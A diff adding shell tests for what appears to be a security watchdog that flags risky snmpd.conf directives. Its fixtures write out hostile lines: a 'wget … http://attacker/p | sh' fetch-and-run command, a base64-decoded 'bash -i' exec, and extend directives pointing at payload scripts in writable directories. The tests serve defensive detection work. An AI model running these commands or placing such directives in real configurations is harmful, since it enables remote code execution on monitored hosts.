@@ -150,3 +150,55 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     PROFILE=enforce run run_wd
     [ "${status}" -eq 0 ]
 }
+
+@test "baseline is chmod 0600 (confidentiality — snmpd inventory enumerates remote-trigger exec surface)" {
+    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
+    run_wd
+    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
+}
+
+@test "INVARIANT (extend directive under /var/tmp): writable-root expansion" {
+    printf 'extend evilcheck /var/tmp/payload.sh\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (extend directive under /dev/shm): tmpfs writable-root coverage" {
+    printf 'extend evilcheck /dev/shm/payload.sh\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (extend directive under /home): user-writable coverage" {
+    printf 'extend evilcheck /home/user/payload.sh\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (pass directive with wget-pipe-sh)" {
+    printf 'pass .1.3.6.1.4.1.8072 /bin/sh -c "wget -qO- http://attacker/p | sh"\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (exec directive with base64-decode-pipe)" {
+    printf 'exec b64 /bin/sh -c "echo YmFzaCAtaQ== | base64 -d | bash"\n' > "${CONF}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (world-writable snmpd.conf → alert)" {
+    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
+    run_wd
+    chmod 0666 "${CONF}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
+    printf 'exec uptimecheck /usr/bin/uptime\n' > "${CONF}"
+    run_wd
+    main_count=$(cap | grep -cE '^-t selfdef-snmpd-exec -- ')
+    [ "${main_count}" = "1" ]
+}
